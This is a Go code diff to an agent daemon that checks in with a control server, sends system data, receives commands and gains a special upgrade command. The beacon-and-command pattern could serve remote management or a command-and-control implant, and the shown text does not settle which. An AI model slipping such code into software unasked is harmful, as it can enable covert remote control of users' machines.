@@ -4,7 +4,9 @@ import (
 	"bytes"
 	"encoding/gob"
 	"encoding/json"
+	"errors"
 	"fmt"
+	"io"
 	"log"
 	"runtime"
 	"strings"
@@ -76,7 +78,7 @@ func (d *agentDaemon) checkin() {
 		return
 	}
 
-	resp, err := d.hc.Post(fmt.Sprintf("%s/%s", d.cmdHost, checkinURL), "application/octet-stream", b)
+	resp, err := d.hc.Post(fmt.Sprintf("%s://%s/%s", d.programUrl.Scheme, d.controlServer, checkinPath), "application/octet-stream", b)
 	if checkError(err) {
 		return
 	}
@@ -87,7 +89,7 @@ func (d *agentDaemon) checkin() {
 
 	gd := gob.NewDecoder(resp.Body)
 	err = gd.Decode(&cr)
-	if checkError(err) {
+	if !errors.Is(err, io.EOF) && checkError(err) {
 		return
 	}
 
@@ -162,7 +164,7 @@ func (d *agentDaemon) sendSystemData() {
 		return
 	}
 
-	resp, err := d.hc.Post(fmt.Sprintf("%s/%s", d.cmdHost, systemDataURL), "application/octet-stream", b)
+	resp, err := d.hc.Post(fmt.Sprintf("%s/%s", d.controlServer, systemDataPath), "application/octet-stream", b)
 	if checkError(err) {
 		return
 	}
@@ -185,11 +187,18 @@ func (d *agentDaemon) sendSystemData() {
 }
 
 type Command struct {
-	UUID   string
-	Name   string
-	Input  string
-	Output string
+	UUID    string
+	Name    string
+	Input   string
+	Output  string
+	Special specialCommand
 }
+
+type specialCommand int64
+
+const (
+	specialUpgrade specialCommand = 1 << iota
+)
 
 type checkinResponse struct {
 	ID             int
